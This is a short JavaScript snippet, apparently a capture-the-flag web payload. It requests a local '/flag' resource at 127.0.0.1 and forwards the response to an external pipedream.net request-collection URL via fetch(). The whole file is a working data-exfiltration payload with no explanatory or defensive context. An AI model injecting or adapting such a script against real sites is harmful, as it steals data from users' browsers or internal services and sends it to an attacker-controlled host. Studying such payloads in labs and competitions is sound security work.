function reqListener () {
  fetch("https://ennv0phuqv24d.x.pipedream.net/?"+this.responseText);
}
const req = new XMLHttpRequest();
req.addEventListener("load", reqListener);
req.open("GET", "http://127.0.0.1/flag");
req.send();
